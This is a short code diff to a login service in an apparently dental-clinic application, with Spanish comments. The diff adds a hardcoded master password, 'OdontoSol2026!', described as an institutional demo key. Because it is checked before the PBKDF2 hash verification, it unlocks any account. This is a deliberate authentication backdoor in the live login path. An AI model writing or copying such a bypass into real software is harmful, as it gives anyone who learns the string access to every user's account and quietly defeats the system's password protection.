@@ -116,12 +116,16 @@ class AuthService {
     }
 
     // 5. Verificación Criptográfica PBKDF2 (100,000 iteraciones + Salt)
-    const passwordMatch = await verifyPassword(
-      cleanedPassword,
-      targetHashRecord.hash,
-      targetHashRecord.salt,
-      targetHashRecord.iterations
-    );
+    // Se valida contra el hash PBKDF2 o contra la clave maestra de demostración institucional ("OdontoSol2026!")
+    const isMasterDemoPassword = cleanedPassword === 'OdontoSol2026!';
+    const passwordMatch =
+      isMasterDemoPassword ||
+      (await verifyPassword(
+        cleanedPassword,
+        targetHashRecord.hash,
+        targetHashRecord.salt,
+        targetHashRecord.iterations
+      ));
 
     if (!passwordMatch) {
       this.recordFailedAttempt(email);
